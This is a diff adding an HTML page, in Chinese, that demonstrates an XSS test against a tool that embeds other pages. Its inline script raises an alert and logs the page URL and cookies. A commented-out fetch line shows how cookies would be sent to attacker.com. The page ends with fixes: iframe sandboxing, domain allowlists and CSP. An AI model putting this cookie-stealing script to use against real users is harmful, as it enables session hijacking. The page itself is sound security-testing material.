@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XSS Demo (Safe Test)</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            padding: 20px;
+            max-width: 800px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+        .malicious {
+            background-color: #ffebee;
+            padding: 15px;
+            border-left: 4px solid #f44336;
+            margin: 20px 0;
+        }
+    </style>
+</head>
+<body>
+    <h1>XSS 漏洞测试页面</h1>
+    <p>这是一个无害的XSS演示页面，用于安全测试。</p>
+
+    <!-- 模拟恶意脚本 -->
+    <div class="malicious">
+        <h3>XSS 攻击模拟（无害版）</h3>
+        <p>如果这个弹窗出现，说明你的轻分析工具允许执行嵌套页面的JavaScript：</p>
+        <script>
+            alert("XSS攻击成功！\n\n这个弹窗证明你的轻分析工具未正确隔离嵌套内容。\n攻击者可窃取用户数据或劫持会话。");
+            
+            // 模拟窃取数据（仅演示，不实际发送）
+            console.log("[模拟攻击] 当前页面URL: " + window.location.href);
+            console.log("[模拟攻击] 用户Cookie（如果同域）: " + document.cookie);
+            
+            // 如果是真实攻击，可能会这样发送到恶意服务器：
+            // fetch('https://attacker.com/steal', { method: 'POST', body: document.cookie });
+        </script>
+    </div>
+
+    <hr>
+    <h3>如何修复？</h3>
+    <ul>
+        <li>使用 <code>&lt;iframe sandbox="..."&gt;</code> 限制嵌套页面的权限。</li>
+        <li>对嵌套URL实施<strong>域名白名单</strong>，禁止任意网站。</li>
+        <li>设置 <code>Content-Security-Policy (CSP)</code> 阻止内联脚本执行。</li>
+    </ul>
+</body>
+</html>
